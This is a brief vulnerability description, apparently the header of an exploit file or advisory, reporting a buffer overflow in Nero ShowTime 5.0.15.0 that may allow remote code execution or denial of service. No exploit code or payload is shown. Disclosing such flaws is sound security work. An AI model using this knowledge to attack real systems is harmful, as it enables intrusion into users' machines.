# Description: Nero ShowTime is prone to a buffer-overflow vulnerability because it fails
# to perform adequate boundary checks on user-supplied input. Successfully exploiting
# these issues may allow remote attackers to execute arbitrary code in the context of the
# application. Failed exploit attempts will cause denial-of-service conditions. Nero ShowTime
# 5.0.15.0 is vulnerable, prior versions may also be affected.
